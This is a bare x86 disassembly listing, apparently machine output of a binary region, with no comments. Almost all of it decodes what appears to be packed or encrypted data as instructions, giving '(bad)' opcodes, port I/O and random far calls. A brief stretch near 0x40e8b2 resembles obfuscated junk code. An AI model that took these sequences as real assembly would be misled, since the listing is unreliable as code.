  40e4f4:	xchg   ebp,eax
  40e4f5:	into   
  40e4f6:	hlt    
  40e4f7:	adc    eax,0xb0dc9fa3
  40e4fc:	jle    0x40e4c3
  40e4fe:	xchg   esi,eax
  40e4ff:	iret   
  40e500:	dec    ecx
  40e501:	popa   
  40e502:	mov    ebx,0xd86bc77e
  40e507:	or     BYTE PTR [esi],dh
  40e509:	into   
  40e50a:	das    
  40e50b:	add    ebx,DWORD PTR [edx*4+0x4e436aed]
  40e512:	inc    esi
  40e513:	push   edi
  40e514:	add    ah,dh
  40e516:	inc    edx
  40e517:	test   BYTE PTR [esi+0x35d7d3a6],0x15
  40e51e:	call   FWORD PTR [edx+0x44]
  40e521:	out    0xd9,eax
  40e523:	adc    eax,DWORD PTR [eax]
  40e525:	xor    al,0x4c
  40e527:	stc    
  40e528:	mov    bh,0x15
  40e52a:	add    BYTE PTR [ecx+esi*2],0x22
  40e52e:	retf   0xfe8a
  40e531:	push   0xe
  40e533:	loopne 0x40e4d2
  40e535:	out    0x14,al
  40e537:	(bad)  
  40e538:	adc    DWORD PTR [esp+eiz*2+0x4d2fdd17],ebx
  40e53f:	dec    BYTE PTR [edx-0x7c469bcd]
  40e545:	enter  0x4b2,0xc7
  40e549:	scas   eax,DWORD PTR es:[edi]
  40e54a:	outs   dx,BYTE PTR ds:[esi]
  40e54b:	pop    ebp
  40e54c:	in     eax,dx
  40e54d:	add    edx,DWORD PTR ds:[ebx+0x12]
  40e551:	out    0x21,eax
  40e553:	add    eax,0x6303cc80
  40e558:	xchg   ebx,eax
  40e559:	cmp    ebx,DWORD PTR [ecx]
  40e55b:	cdq    
  40e55c:	scas   al,BYTE PTR es:[edi]
  40e55d:	neg    dl
  40e55f:	pusha  
  40e560:	stos   DWORD PTR es:[edi],eax
  40e561:	sbb    al,0xa0
  40e563:	cmc    
  40e564:	les    edx,FWORD PTR [edx]
  40e566:	adc    BYTE PTR [ebp+0x9cb3f13],ch
  40e56c:	inc    ebp
  40e56d:	push   ebx
  40e56e:	icebp  
  40e56f:	fs js  0x40e4ff
  40e572:	idiv   DWORD PTR [edi+0x79a7695c]
  40e578:	sub    dl,BYTE PTR ds:0x7c5655ff
  40e57e:	mov    WORD PTR [edx],fs
  40e580:	bound  esi,QWORD PTR [ebp-0x99634d9]
  40e586:	mov    BYTE PTR [edi-0x9836c8d],ah
  40e58c:	clc    
  40e58d:	out    0xa3,al
  40e58f:	icebp  
  40e590:	out    dx,al
  40e591:	rcl    DWORD PTR [eax],1
  40e593:	popa   
  40e594:	cmp    al,0x5d
  40e596:	cdq    
  40e597:	sub    WORD PTR [esp+eax*8+0x24],0x41
  40e59d:	dec    ebx
  40e59e:	int    0x32
  40e5a0:	fnstenv [ecx-0x50a126f9]
  40e5a6:	cmc    
  40e5a7:	add    DWORD PTR [edi+0x173c202e],eax
  40e5ad:	sbb    BYTE PTR [ebx-0x39],cl
  40e5b0:	out    0x73,eax
  40e5b2:	mov    al,0x5a
  40e5b4:	pop    eax
  40e5b5:	or     DWORD PTR [edx-0x43b32622],0xffffff86
  40e5bc:	mov    ch,BYTE PTR [eax+edi*8-0x2b5b495c]
  40e5c3:	pop    es
  40e5c4:	jnp    0x40e5e3
  40e5c6:	(bad)  
  40e5c7:	adc    eax,DWORD PTR [ebx+eax*2-0x56]
  40e5cb:	hlt    
  40e5cc:	in     eax,dx
  40e5cd:	stos   DWORD PTR es:[edi],eax
  40e5ce:	mov    edx,0xc8b1143c
  40e5d3:	cmp    bh,ch
  40e5d5:	icebp  
  40e5d6:	mov    bl,0xb0
  40e5d8:	jecxz  0x40e615
  40e5da:	cmc    
  40e5db:	push   0xfd260617
  40e5e0:	fdivr  DWORD PTR [ebx+ecx*1-0x2ebd6b74]
  40e5e7:	xchg   esp,eax
  40e5e8:	call   0x8f10:0x98d9841e
  40e5ef:	jo     0x40e5bb
  40e5f1:	mov    ebp,0x8206d1b7
  40e5f6:	cmp    DWORD PTR [ecx-0x30],esp
  40e5f9:	add    DWORD PTR [ecx],esi
  40e5fb:	xor    al,0x22
  40e5fd:	xlat   BYTE PTR ds:[ebx]
  40e5fe:	test   eax,0x33fae614
  40e603:	and    BYTE PTR [ebx+0x6f],al
  40e606:	or     DWORD PTR [ebp+0x3949f1ac],edx
  40e60c:	cmp    DWORD PTR [ebp-0x1200340],0x6a
  40e613:	hlt    
  40e614:	dec    esi
  40e615:	hlt    
  40e616:	xor    eax,0xbbba6fe3
  40e61b:	sub    eax,0xda71c4d
  40e620:	dec    ebx
  40e621:	sbb    eax,0x6ddf7fff
  40e626:	shl    dl,cl
  40e628:	repz mov dh,0x97
  40e62b:	(bad)  
  40e62c:	jg     0x40e5e4
  40e62e:	cwde   
  40e62f:	xchg   edi,eax
  40e630:	mov    ebp,0xfc9c5313
  40e635:	hlt    
  40e636:	ret    0xe0df
  40e639:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e63a:	jae    0x40e6aa
  40e63c:	push   edx
  40e63d:	fld    DWORD PTR [ebp+eiz*1+0x1]
  40e641:	and    ch,0x57
  40e644:	xchg   esp,eax
  40e645:	add    eax,0x86af048c
  40e64a:	push   es
  40e64b:	push   edi
  40e64c:	mov    ebx,0x8f50a167
  40e651:	fnstcw WORD PTR ds:0xe2fe7096
  40e657:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e658:	hlt    
  40e659:	ret    0xe906
  40e65c:	pop    esp
  40e65d:	mov    dl,0xd8
  40e65f:	std    
  40e660:	clc    
  40e661:	les    ebx,FWORD PTR [eax+edx*4]
  40e664:	retf   0x4ed1
  40e667:	fsubr  QWORD PTR [ebp+ebx*2-0x20b698ce]
  40e66e:	cmp    eax,0x22bfe462
  40e673:	and    BYTE PTR [ebx],bl
  40e675:	ret    
  40e676:	mov    esi,0xbc2dac00
  40e67b:	push   esi
  40e67c:	mov    al,ds:0x81ad19c7
  40e681:	xor    al,0x30
  40e683:	sub    eax,0x93143e03
  40e688:	xchg   esp,eax
  40e689:	rol    BYTE PTR [ebx+0x75],cl
  40e68c:	sub    BYTE PTR [ecx+0x5d],ch
  40e68f:	pusha  
  40e690:	sar    DWORD PTR [edi+ebp*2+0x20],0x53
  40e695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e696:	jno    0x40e655
  40e698:	mov    eax,0x541be5b2
  40e69d:	popw   es
  40e69f:	lock fdivp st(5),st
  40e6a2:	iret   
  40e6a3:	push   ecx
  40e6a4:	push   edi
  40e6a5:	nop
  40e6a6:	sbb    eax,0x4a683805
  40e6ab:	std    
  40e6ac:	call   0x5d4b:0x715c5eb7
  40e6b3:	mov    edi,0x7ea01cd3
  40e6b8:	call   0x35e6:0xaea42eb8
  40e6bf:	neg    BYTE PTR [ebx]
  40e6c1:	fs es (bad) 
  40e6c4:	sub    bl,dl
  40e6c6:	out    dx,al
  40e6c7:	int    0xd3
  40e6c9:	outs   dx,DWORD PTR ds:[esi]
  40e6ca:	inc    eax
  40e6cb:	test   BYTE PTR [ebp-0x13efccce],dl
  40e6d1:	into   
  40e6d2:	mov    bh,0xf0
  40e6d4:	imul   esp,eax,0x38
  40e6d7:	inc    ebx
  40e6d8:	fisttp WORD PTR [edi]
  40e6da:	push   ds
  40e6db:	fucom  st(1)
  40e6dd:	jbe    0x40e705
  40e6df:	dec    esi
  40e6e0:	mov    ch,BYTE PTR [eax+0x4736599d]
  40e6e6:	test   BYTE PTR [ebp+ebp*8-0x41],dl
  40e6ea:	scas   al,BYTE PTR es:[edi]
  40e6eb:	xchg   ecx,eax
  40e6ec:	xlat   BYTE PTR ds:[ebx]
  40e6ed:	mov    esp,0xc28e667f
  40e6f2:	add    BYTE PTR [eax],bh
  40e6f4:	xor    DWORD PTR [edx-0x42],esp
  40e6f7:	jnp    0x40e69a
  40e6f9:	sub    edi,DWORD PTR [esi+edi*4-0x37]
  40e6fd:	outs   dx,DWORD PTR ds:[esi]
  40e6fe:	jecxz  0x40e6a2
  40e700:	sbb    DWORD PTR [ecx],esi
  40e702:	lods   al,BYTE PTR ds:[esi]
  40e703:	jo     0x40e77b
  40e705:	rcl    BYTE PTR ds:0xcbb61579,cl
  40e70b:	or     eax,0x44f9ffec
  40e710:	sbb    esp,edi
  40e712:	(bad)
  40e715:	setb   BYTE PTR [esi-0x413374b7]
  40e71c:	ds popf 
  40e71e:	(bad)  
  40e71f:	nop
  40e720:	lock rol BYTE PTR [ecx+eax*2-0x7546a414],0xd1
  40e729:	loope  0x40e71e
  40e72b:	je     0x40e702
  40e72d:	pop    edi
  40e72e:	push   0xffffffbd
  40e730:	xchg   BYTE PTR [esi-0x5689920],al
  40e736:	add    BYTE PTR [edx+0x15],dh
  40e739:	ja     0x40e6c4
  40e73b:	sbb    ecx,0x4d0fc75f
  40e741:	mov    eax,ds:0x9654b66a
  40e746:	rcr    DWORD PTR [ebx-0x3],cl
  40e749:	aas    
  40e74a:	je     0x40e745
  40e74c:	test   eax,0xa1b14d0f
  40e751:	out    0xa2,al
  40e753:	inc    ecx
  40e754:	je     0x40e770
  40e756:	cs addr16 test eax,0xf100b18b
  40e75d:	mov    bl,0x10
  40e75f:	jbe    0x40e6e1
  40e761:	and    bl,al
  40e763:	adc    DWORD PTR [ecx],ecx
  40e765:	(bad)  
  40e767:	out    0xe3,al
  40e769:	loopne 0x40e7ac
  40e76b:	pop    eax
  40e76c:	fsub   DWORD PTR [esi+ebp*2-0x6c]
  40e770:	cmp    BYTE PTR [edx+0x5423ca12],al
  40e776:	arpl   WORD PTR [eax+0x420aac34],sp
  40e77c:	stos   DWORD PTR es:[edi],eax
  40e77d:	sar    ah,1
  40e77f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e780:	std    
  40e781:	in     eax,dx
  40e782:	fst    QWORD PTR [ebp-0x73]
  40e785:	jmp    0x40e742
  40e787:	or     DWORD PTR gs:[esi],0xffffffbf
  40e78b:	and    ebp,DWORD PTR [ecx]
  40e78d:	cmovnp edi,DWORD PTR [edi]
  40e790:	in     eax,0xf9
  40e792:	mov    bl,0x67
  40e794:	or     al,0xbf
  40e796:	cmp    BYTE PTR [esi+ebx*1-0x49],0x62
  40e79b:	outs   dx,BYTE PTR ds:[esi]
  40e79c:	xchg   ebp,eax
  40e79d:	test   bh,dh
  40e79f:	jle    0x40e78b
  40e7a1:	xor    al,0x80
  40e7a3:	stos   BYTE PTR es:[edi],al
  40e7a4:	int    0x81
  40e7a6:	retf   
  40e7a7:	push   edi
  40e7a8:	neg    BYTE PTR [edi+eiz*8+0x24]
  40e7ac:	push   edx
  40e7ad:	mov    ds:0xed2f32e3,al
  40e7b2:	sbb    ch,0xff
  40e7b5:	sbb    DWORD PTR [esi+0x621d5078],ebx
  40e7bb:	xor    ah,BYTE PTR [ebp+ecx*1-0x1e]
  40e7bf:	push   ebp
  40e7c0:	test   al,0xda
  40e7c2:	mov    bh,0xed
  40e7c4:	mov    cl,BYTE PTR [ebx+0x14283a84]
  40e7ca:	push   cs
  40e7cb:	xchg   edx,eax
  40e7cc:	sar    DWORD PTR [ebp+edi*2+0x6d],0xdd
  40e7d1:	jle    0x40e846
  40e7d3:	or     eax,0xdb2a9a82
  40e7d8:	mov    eax,0xbb8a576d
  40e7dd:	mov    ch,0x40
  40e7df:	bound  esp,QWORD PTR gs:[eax]
  40e7e2:	or     eax,0xe4c5d8e6
  40e7e7:	push   eax
  40e7e8:	inc    esp
  40e7e9:	fs aaa 
  40e7eb:	call   FWORD PTR [eax-0x43]
  40e7ee:	mov    dh,0x48
  40e7f0:	clc    
  40e7f1:	cmp    esi,esi
  40e7f3:	icebp  
  40e7f4:	mov    edi,0xb1ed5fd7
  40e7fa:	push   cs
  40e7fb:	aaa    
  40e7fc:	cli    
  40e7fd:	push   esi
  40e7fe:	test   DWORD PTR [ecx+0xd5f8755],0xc0975b1f
  40e808:	(bad)  
  40e809:	aas    
  40e80a:	call   0x4408:0xeb4ca242
  40e811:	mov    esp,0xd7b12eb2
  40e816:	jge    0x40e868
  40e818:	(bad)  
  40e819:	sahf   
  40e81a:	mov    bh,0xc2
  40e81c:	mov    dh,0xf3
  40e81e:	sub    edx,DWORD PTR [ebx]
  40e820:	xchg   ecx,eax
  40e821:	retf   
  40e822:	or     al,0x89
  40e824:	xchg   ecx,eax
  40e825:	mov    edi,cs
  40e827:	jne    0x40e7b5
  40e829:	inc    edx
  40e82a:	(bad)  
  40e82b:	or     edi,ecx
  40e82d:	psubb  mm4,QWORD PTR [edx-0x61b1be9b]
  40e834:	jae    0x40e7f0
  40e836:	sti    
  40e837:	shl    DWORD PTR [esi-0x584b336e],cl
  40e83d:	or     DWORD PTR [eax-0x5],0x70
  40e841:	enter  0xb21,0x49
  40e845:	fs jmp 0x1b50e6d1
  40e84b:	inc    bl
  40e84d:	fsubr  st,st(2)
  40e84f:	lds    ecx,FWORD PTR [eax]
  40e851:	mov    edi,0x6b605d92
  40e856:	stc    
  40e857:	xchg   ecx,eax
  40e858:	repz dec edx
  40e85a:	sub    edx,esp
  40e85c:	and    al,0x82
  40e85e:	retf   0x1c8d
  40e861:	fdiv   QWORD PTR [ebx]
  40e864:	xchg   edx,eax
  40e865:	jne    0x40e8ba
  40e867:	jns    0x40e89c
  40e869:	(bad)  
  40e86a:	pop    ebx
  40e86b:	dec    ecx
  40e86c:	mov    ch,0x8
  40e86e:	pop    edi
  40e86f:	xor    edi,DWORD PTR [edi+0xc]
  40e872:	lock jmp 0xd25cd5b2
  40e878:	imul   edx,DWORD PTR [ecx],0xb79bdcd9
  40e87e:	adc    al,cl
  40e880:	into   
  40e881:	pop    ebx
  40e882:	xchg   edx,eax
  40e883:	xchg   edx,eax
  40e884:	ds or  eax,0xdbf6d640
  40e88a:	jecxz  0x40e904
  40e88c:	gs popa 
  40e88e:	mov    dl,BYTE PTR [eax+ebp*1]
  40e891:	add    eax,0x76c94521
  40e896:	sbb    DWORD PTR [ebp+0x26],edi
  40e899:	inc    eax
  40e89a:	outs   dx,DWORD PTR ds:[esi]
  40e89b:	call   0x5535:0x8be04d8b
  40e8a2:	inc    esp
  40e8a3:	inc    ebx
  40e8a4:	add    BYTE PTR [ebx-0x61caceca],cl
  40e8aa:	inc    ebx
  40e8ab:	inc    ebx
  40e8ac:	add    BYTE PTR [esi+0x7510855],bh
  40e8b2:	xor    DWORD PTR ds:0x4343a2,0x4326ec
  40e8bc:	xor    eax,esi
  40e8be:	add    eax,ebx
  40e8c0:	mov    DWORD PTR ds:0x432dc2,0x3895
  40e8ca:	cmp    ecx,eax
  40e8cc:	mov    DWORD PTR ds:0x434411,0xed9
  40e8d6:	je     0x40fd3a
  40e8dc:	push   DWORD PTR [ebp-0x20]
  40e8df:	adc    DWORD PTR ds:0x432dc2,0x4326f8
  40e8e9:	push   DWORD PTR [ebp+0x8]
  40e8ec:	call   0x404cd4
  40e8f1:	jmp    0x40ece5
  40e8f6:	ret    
  40e8f7:	rcr    BYTE PTR [ebp-0x67],1
  40e8fa:	popa   
  40e8fb:	cdq    
  40e8fc:	ret    
  40e8fd:	xor    WORD PTR [eax],0xffa7
  40e901:	fimul  DWORD PTR [ebx-0x3d]
  40e904:	cmp    eax,0x709a2ba1
  40e909:	jo     0x40e954
  40e90b:	jge    0x40e97d
  40e90d:	jo     0x40e920
  40e90f:	push   eax
  40e910:	dec    ebx
  40e911:	fidiv  DWORD PTR [edi]
  40e913:	xchg   esi,eax
  40e914:	jg     0x40e958
  40e916:	mov    ebx,0x692eec94
  40e91b:	sbb    DWORD PTR [edx],ecx
  40e91d:	out    dx,eax
  40e91e:	jbe    0x40e98e
  40e920:	jecxz  0x40e8aa
  40e922:	add    ah,al
  40e924:	push   ecx
  40e925:	cmp    DWORD PTR [ebx-0xb],edi
  40e928:	adc    BYTE PTR [eax-0x6f],ah
  40e92b:	icebp  
  40e92c:	and    ah,BYTE PTR [ebx+0x65301654]
  40e932:	fdiv   st(7),st
  40e934:	retf   0x241c
  40e937:	xor    eax,0x593565ed
  40e93c:	xor    al,0x37
  40e93e:	jmp    0x7bbf7dc0
  40e943:	cs sbb dl,BYTE PTR ss:[ebx+ebp*1]
  40e948:	iret   
  40e949:	loope  0x40e8f5
  40e94b:	jno    0x40e8dc
  40e94d:	ins    BYTE PTR es:[edi],dx
  40e94e:	loope  0x40e9ba
  40e950:	stos   BYTE PTR es:[edi],al
  40e951:	mov    edi,DWORD PTR [edx]
  40e953:	mov    al,0x15
  40e955:	or     esi,ebx
  40e957:	dec    edi
  40e958:	add    DWORD PTR [edi],ecx
  40e95a:	stos   BYTE PTR es:[edi],al
  40e95b:	in     al,0xe
  40e95d:	cmp    al,0x69
  40e95f:	mov    dl,0x74
  40e961:	push   ds
  40e962:	leave  
  40e963:	mov    cl,0x2b
  40e965:	and    esp,DWORD PTR [edi-0x72]
  40e968:	nop
  40e969:	and    al,BYTE PTR [edx]
  40e96b:	sbb    BYTE PTR [edi-0x79],0xc7
  40e96f:	and    DWORD PTR [ebx+esi*8+0x70],ecx
  40e973:	ja     0x40e949
  40e975:	gs aas 
  40e977:	adc    BYTE PTR [edx+edx*1+0x3a],dh
  40e97b:	or     BYTE PTR [ecx+0x2cb14b3d],bh
  40e981:	pop    eax
  40e982:	cld    
  40e983:	mov    ds:0xf89e0034,eax
  40e988:	push   esp
  40e989:	push   ss
  40e98a:	lds    ecx,FWORD PTR [ebx+0x2e6f6fc8]
  40e990:	dec    ecx
  40e991:	add    ah,BYTE PTR [edi]
  40e993:	ror    BYTE PTR [esi-0x18],0x3b
  40e997:	adc    eax,0xb073bea
  40e99c:	popf   
  40e99d:	or     al,0xf7
  40e99f:	sbb    ebp,DWORD PTR [edi+0x22]
  40e9a2:	mov    edx,0xdbf1ea97
  40e9a7:	sbb    DWORD PTR [edx],esp
  40e9a9:	les    esp,FWORD PTR ds:0x2bff8928
  40e9af:	jmp    0x61b5079f
  40e9b4:	retf   0xb720
  40e9b7:	inc    eax
  40e9b8:	push   0x669088f0
  40e9bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9be:	addr16 in eax,dx
  40e9c0:	sbb    ah,cl
  40e9c2:	(bad)  
  40e9c4:	pop    ebx
  40e9c5:	pop    es
  40e9c6:	mov    bh,0x3b
  40e9c8:	lahf   
  40e9c9:	mov    dl,0x9f
  40e9cb:	dec    ebp
  40e9cc:	cli    
  40e9cd:	stos   BYTE PTR es:[edi],al
  40e9ce:	aam    0xdc
  40e9d0:	aaa    
  40e9d1:	push   ebx
  40e9d2:	mov    esi,0xf4698b60
  40e9d7:	and    BYTE PTR [ebx+0x5abde392],ah
  40e9dd:	mov    ds:0x29e393a5,al
  40e9e2:	jmp    0xb2aa:0x4b3da322
  40e9e9:	jb     0x40e983
  40e9eb:	mov    ch,0x4
  40e9ed:	xchg   esp,eax
  40e9ee:	hlt    
  40e9ef:	ret    0x99b7
  40e9f2:	stc    
  40e9f3:	call   0x6122:0x45cae944
  40e9fa:	sub    eax,0x5614522d
  40e9ff:	loop   0x40ea79
  40ea01:	mov    ds,WORD PTR [edx+0x53]
  40ea04:	jbe    0x40ea07
  40ea06:	daa    
  40ea07:	mov    edx,0x18a0383f
  40ea0c:	mov    ch,0x8f
  40ea0e:	jbe    0x40e9ea
  40ea10:	mov    al,0xe4
  40ea12:	sub    BYTE PTR [ecx],0xe7
  40ea15:	clc    
  40ea16:	cwde   
  40ea17:	push   cs
  40ea18:	inc    ebp
  40ea19:	or     al,ch
  40ea1b:	xlat   BYTE PTR ds:[ebx]
  40ea1c:	je     0x40ea98
  40ea1e:	pop    esp
  40ea1f:	jae    0x40ea33
  40ea21:	outs   dx,BYTE PTR ds:[esi]
  40ea22:	pop    edi
  40ea23:	sbb    eax,0xbe24f2a1
  40ea28:	sub    bl,bl
  40ea2a:	stos   DWORD PTR es:[edi],eax
  40ea2b:	and    eax,0x9804a11f
  40ea30:	jbe    0x40ea8b
  40ea32:	jne    0x40ea8f
  40ea34:	xchg   ecx,eax
  40ea35:	ja     0x40ea23
  40ea37:	sbb    eax,0x2000a84e
  40ea3c:	fild   QWORD PTR [ebp+0x25d90c4e]
  40ea42:	sbb    eax,0xfeab0cb4
  40ea47:	fisttp WORD PTR [ebp+0x4b]
  40ea4a:	jmp    0xc7dfc78a
  40ea4f:	ins    BYTE PTR es:[edi],dx
  40ea50:	pop    ebx
  40ea51:	xor    al,0x2b
  40ea53:	aad    0xd
  40ea55:	jnp    0x40ea01
  40ea57:	jnp    0x40eaa1
  40ea59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea5a:	inc    ecx
  40ea5b:	std    
  40ea5c:	jnp    0x40ead0
  40ea5e:	jns    0x40ea3c
  40ea60:	inc    ebp
  40ea61:	in     eax,0xb4
  40ea63:	and    ecx,eax
  40ea65:	imul   esi,DWORD PTR [edx-0x8b2b06],0xc24c4b5a
  40ea6f:	pop    ecx
  40ea70:	dec    edi
  40ea71:	xchg   ecx,eax
  40ea72:	mov    ds:0x4c1ba4a7,eax
  40ea77:	sbb    al,cl
  40ea79:	mov    al,ds:0x565adf45
  40ea7e:	call   0x35431a77
  40ea83:	faddp  st(7),st
  40ea85:	test   al,0xb9
  40ea87:	or     bh,BYTE PTR [edx-0x5dfc106f]
  40ea8d:	repnz imul BYTE PTR [ecx]
  40ea90:	push   esp
  40ea91:	or     al,0xf5
  40ea93:	out    0xc8,eax
  40ea95:	mov    ch,0xe1
  40ea97:	pop    esi
  40ea98:	add    eax,0xa41bcfcf
  40ea9d:	repnz mov bl,0x8a
  40eaa0:	ins    DWORD PTR es:[edi],dx
  40eaa1:	cmp    al,BYTE PTR [ecx+0x4b]
  40eaa4:	dec    edx
  40eaa5:	jne    0x40ea98
  40eaa7:	xor    al,0xaf
  40eaa9:	push   0xf71054b6
  40eaae:	call   0x8db2e711
  40eab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eab4:	sub    al,0xce
  40eab6:	dec    ebx
  40eab7:	add    DWORD PTR [ebp+edx*2+0xb],esp
  40eabb:	mov    bh,0xe9
  40eabd:	out    0x2c,al
  40eabf:	xchg   esi,eax
  40eac0:	inc    eax
  40eac1:	and    DWORD PTR [edx+0x5abbbded],esi
  40eac7:	cmp    ah,BYTE PTR [esi-0x7daed3d5]
  40eacd:	add    ecx,ebx
  40eacf:	and    DWORD PTR [edx+edx*2],edi
  40ead2:	dec    eax
  40ead3:	mov    ecx,0x7f56153
  40ead8:	test   al,0xe3
  40eada:	iret   
  40eadb:	aas    
  40eadc:	das    
  40eadd:	sub    al,0x87
  40eadf:	adc    bh,BYTE PTR [esi-0x2f59ab0b]
  40eae5:	scas   eax,DWORD PTR es:[edi]
  40eae6:	mov    DWORD PTR [eax+0x44fe4908],edx
  40eaec:	aaa    
  40eaed:	inc    esi
  40eaee:	xor    DWORD PTR [ebx+0x672f486a],edi
  40eaf4:	dec    ecx
  40eaf5:	stos   BYTE PTR es:[edi],al
  40eaf6:	fs jl  0x40eb5a
  40eaf9:	mov    DWORD PTR [ebx-0x4467d859],esi
  40eaff:	mov    ch,0x84
  40eb01:	jge    0x40eaf6
  40eb03:	ret    0x76c3
  40eb06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eb07:	push   cs
  40eb08:	into   
  40eb09:	jge    0x40eaf5
  40eb0b:	add    ebp,edx
  40eb0d:	sub    DWORD PTR [ebx+0x51],ebx
  40eb10:	rcl    DWORD PTR [ebx-0x775ba7a8],0x6f
  40eb17:	fwait
  40eb18:	shl    BYTE PTR [eax+0x33],0xf
  40eb1c:	fmul   QWORD PTR [ebx+0x79]
  40eb1f:	push   cs
  40eb20:	frstor [edx]
  40eb22:	shl    DWORD PTR [edx+0xbddae9a],1
  40eb28:	imul   ecx,DWORD PTR cs:[edi-0x1b13412d],0x8311d7b
  40eb33:	sbb    bl,BYTE PTR [edi-0x23028744]
  40eb39:	jmp    0x40eb23
  40eb3b:	hlt    
  40eb3c:	sbb    al,BYTE PTR [esi+0x70ad5242]
  40eb42:	xchg   ebp,eax
  40eb43:	gs ins BYTE PTR es:[edi],dx
  40eb45:	inc    esp
  40eb46:	push   esp
  40eb47:	jle    0x40eba4
  40eb49:	adc    eax,0x7e4a83f3
  40eb4e:	sti    
  40eb4f:	jge    0x40eafe
  40eb51:	xor    ch,BYTE PTR [ebx-0x2e487940]
  40eb57:	jb     0x40ebc0
  40eb59:	aad    0xb1
  40eb5b:	outs   dx,DWORD PTR ds:[esi]
  40eb5c:	pop    dx
  40eb5e:	iret   
  40eb5f:	mov    bl,0x4f
  40eb61:	mov    al,BYTE PTR [eax-0x259d50ee]
  40eb67:	(bad)  
  40eb68:	aad    0xa2
  40eb6a:	and    eax,0x5c52aca2
  40eb6f:	jecxz  0x40eb90
  40eb71:	outs   dx,DWORD PTR ds:[esi]
  40eb72:	nop
  40eb73:	mov    dl,0x10
  40eb75:	adc    edx,edx
  40eb77:	stc    
  40eb78:	pop    ebp
  40eb79:	sbb    DWORD PTR [ecx-0x33187d80],edi
  40eb7f:	jg     0x40eb58
  40eb81:	pop    esp
  40eb82:	hlt    
  40eb83:	adc    BYTE PTR [edx+eiz*1],dl
  40eb86:	out    dx,eax
  40eb87:	out    0x23,al
  40eb89:	sub    edi,DWORD PTR [edi+0x142f2695]
  40eb8f:	jno    0x40eb92
  40eb91:	test   DWORD PTR [eax-0x2f],0x36fb26c0
  40eb98:	int    0x90
  40eb9a:	popf   
  40eb9b:	dec    edx
  40eb9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb9d:	mov    esi,0x263a9af6
  40eba2:	mov    al,ds:0x341f224b
  40eba7:	cmp    ch,bh
  40eba9:	dec    ebp
  40ebaa:	adc    bh,BYTE PTR [ebx-0x17459692]
  40ebb0:	jl     0x40eb5f
  40ebb2:	xchg   ebx,eax
  40ebb3:	rcl    BYTE PTR [eax],1
  40ebb5:	mov    esp,0x24c0fb78
  40ebba:	out    dx,eax
  40ebbb:	cmp    al,BYTE PTR [ebx]
  40ebbd:	popa   
  40ebbe:	sub    edi,DWORD PTR [eax+0x22]
  40ebc1:	test   al,0x54
  40ebc3:	repz xchg edi,eax
  40ebc5:	mov    ds:0x66869603,al
  40ebca:	nop
  40ebcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebcc:	or     ah,BYTE PTR [ebx+edi*1]
  40ebcf:	stos   DWORD PTR es:[edi],eax
  40ebd0:	fwait
  40ebd1:	ret    
  40ebd2:	fiadd  DWORD PTR [edx]
  40ebd4:	xor    DWORD PTR [ebx],ebp
  40ebd6:	and    ebx,DWORD PTR [edi-0x14]
  40ebd9:	xor    DWORD PTR ds:0xa2c21b31,0xffffff89
  40ebe0:	xor    eax,0x3dbdd676
  40ebe5:	add    DWORD PTR [eax],eax
  40ebe7:	mov    bl,0xec
  40ebe9:	lds    ebx,FWORD PTR ds:0x6dd6d256
  40ebef:	sbb    DWORD PTR [eax-0x4e],eax
  40ebf2:	ja     0x40ebd8
  40ebf4:	dec    esp
  40ebf5:	scas   al,BYTE PTR es:[edi]
  40ebf6:	(bad)  
  40ebf7:	xchg   edx,eax
  40ebf8:	out    dx,al
  40ebf9:	aaa    
  40ebfa:	xchg   DWORD PTR [edi-0x1e2e0ba8],ebx
  40ec00:	and    esi,esp
  40ec02:	mov    ebx,0x4556bc2
  40ec07:	sbb    BYTE PTR [esi],0x12
  40ec0a:	je     0x40ebed
  40ec0c:	lods   al,BYTE PTR ds:[esi]
  40ec0d:	adc    eax,0x832b01d5
  40ec12:	ficom  DWORD PTR [ebx+0x4771c5ca]
  40ec18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec19:	sub    DWORD PTR ds:0x1cf8d2cb,eax
  40ec1f:	outs   dx,DWORD PTR ds:[esi]
  40ec20:	pusha  
  40ec21:	jno    0x40ec3f
  40ec23:	(bad)  
  40ec24:	jne    0x40ec91
  40ec26:	cmp    edx,DWORD PTR [esi+0x3b]
  40ec29:	shl    DWORD PTR fs:[edx],0xc0
  40ec2d:	xchg   ecx,eax
  40ec2e:	cmp    al,0x12
  40ec30:	retf   
  40ec31:	fldpi  
  40ec33:	loop   0x40ec03
  40ec35:	mov    bl,0x2
  40ec37:	sub    esi,edx
  40ec39:	sub    ch,ch
  40ec3b:	int    0xab
  40ec3d:	aam    0x10
  40ec3f:	arpl   WORD PTR [esi+ebx*4-0x401a1a11],dx
  40ec46:	push   ecx
  40ec47:	std    
  40ec48:	pushf  
  40ec49:	out    0x73,eax
  40ec4b:	pop    ecx
  40ec4c:	mov    ah,0x94
  40ec4e:	test   al,0x6f
  40ec50:	call   0x9f1f75a7
  40ec55:	fdivr  DWORD PTR [eax]
  40ec57:	inc    ebx
  40ec58:	cmp    DWORD PTR [esi],ecx
  40ec5a:	mov    al,0xc0
  40ec5c:	fs in  al,dx
  40ec5e:	lods   eax,DWORD PTR ds:[esi]
  40ec5f:	fisub  DWORD PTR [edx+0x320fb98c]
  40ec65:	dec    ebx
  40ec66:	inc    edx
  40ec67:	and    eax,0x3517d995
  40ec6c:	inc    edi
  40ec6d:	pop    eax
  40ec6e:	(bad)  
  40ec6f:	in     al,0xe
  40ec71:	jnp    0x40ec5d
  40ec73:	fstp   QWORD PTR [edx+esi*4]
  40ec76:	or     esi,DWORD PTR [ebx+ecx*8-0xbc25eaa]
  40ec7d:	retf   
  40ec7e:	and    al,BYTE PTR [edi]
  40ec80:	lahf   
  40ec81:	and    DWORD PTR [ecx+0x779ee821],0x58
  40ec88:	xchg   al,dl
  40ec8a:	fxch   st(1)
  40ec8c:	ja     0x40ecd5
  40ec8e:	in     al,dx
  40ec8f:	retf   
  40ec90:	aad    0x0
  40ec92:	jns    0x40ecf0
